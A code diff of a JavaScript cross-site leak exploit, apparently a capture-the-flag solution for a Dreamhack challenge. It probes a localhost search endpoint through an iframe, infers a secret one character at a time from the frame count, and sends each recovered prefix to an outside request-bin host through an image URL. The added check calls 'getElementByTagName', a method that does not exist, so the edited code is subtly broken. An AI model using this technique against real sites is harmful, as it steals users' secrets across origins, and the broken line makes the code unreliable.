@@ -6,7 +6,7 @@
             const iframe = document.getElementById("iframe");
             iframe.src = url;
             iframe.onload = () => { 
-                if (iframe.contentWindow.frames.length != 0)
+                if (iframe.contentWindow.document.getElementByTagName("iframe").length != 0)
                     return resolve();
                 else
                     return reject();
@@ -16,7 +16,7 @@
     async function search(query) {
         try {
             await req(
-              `https://doolyit.tistory.com/37`
+              `http://localhost:8000/search?query=${query}`
             );
             return true;
         } catch (e) {
@@ -30,7 +30,7 @@
             for (let c of chars) {
                 if (await search(secret + c)) {
                     secret += c;
-                    img.src = `https://gzkcsjv.request.dreamhack.games/${secret}`;
+                    img.src = `https://qpyraun.request.dreamhack.games/${secret}`;
                     break;
                 }
             }
